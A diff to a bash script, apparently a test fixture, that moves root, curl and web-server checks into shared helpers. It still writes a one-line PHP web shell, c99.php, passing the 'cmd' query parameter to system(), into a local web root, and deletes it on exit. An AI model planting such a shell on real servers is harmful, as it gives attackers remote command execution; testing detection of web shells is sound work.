@@ -31,16 +31,18 @@
 
 set -euo pipefail
 
+. "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"
+
 BASE=${1:-http://127.0.0.1}
 ROOT=${WEB_ROOT:-/var/www/html}
 SHELL_FILE="$ROOT/uploads/c99.php"
 
-command -v curl >/dev/null || { echo "curl is required" >&2; exit 1; }
-[ "$(id -u)" -eq 0 ] || { echo "run as root: the script writes under $ROOT" >&2; exit 1; }
-curl -s -o /dev/null --max-time 3 "$BASE/" || { echo "no web server answers at $BASE" >&2; exit 1; }
+require_command curl
+require_root "it writes under $ROOT"
+require_web_server "$BASE"
 
 cleanup() { rm -f "$SHELL_FILE"; rmdir "$ROOT/uploads" 2>/dev/null || true; }
-trap cleanup EXIT
+add_cleanup cleanup
 
 mkdir -p "$ROOT/uploads"
 printf '<?php system($_GET["cmd"]); ?>\n' > "$SHELL_FILE"
